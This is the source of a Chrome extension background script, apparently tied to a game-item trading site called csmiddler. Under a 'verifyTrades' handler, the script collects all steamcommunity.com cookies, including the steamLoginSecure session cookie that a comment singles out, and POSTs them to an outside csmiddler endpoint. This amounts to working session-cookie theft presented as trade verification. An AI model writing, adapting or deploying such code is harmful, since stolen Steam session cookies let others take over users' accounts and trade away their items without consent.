(function(define){var __define; typeof define === "function" && (__define=define,define=null);
(() => {
chrome.runtime.onInstalled.addListener(()=>{
    console.log("Extension loaded and background service worker started");
});
chrome.runtime.onMessage.addListener(async function(message) {
    switch(message.type){
        case "verifyTrades":
            {
                // steamLoginSecure is the interesting cookie name (strip first part with Steam ID)
                const steamCookies = await chrome.cookies.getAll({
                    domain: "steamcommunity.com"
                });
                const csmiddlerCookies = await chrome.cookies.getAll({
                    domain: "csmiddler.com"
                });
                if (!steamCookies || !csmiddlerCookies) {
                    console.debug("No cookies found. Exiting.");
                    return;
                }
                const csmiddlerCorrelationId = csmiddlerCookies.find((e)=>e.name === "correlationId" && e.domain === "csmiddler.com")?.value;
                if (!csmiddlerCorrelationId) {
                    console.debug("No correlationId found. Exiting.");
                    return;
                }
                await fetch(`https://extension.csmiddler.com/user-access-token/?CorrelationId=${csmiddlerCorrelationId}`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        steamCookies: steamCookies
                    })
                });
            }
            break;
        default:
            console.debug("Unknown message type");
            break;
    }
});



})();
 globalThis.define=__define;  })(globalThis.define);
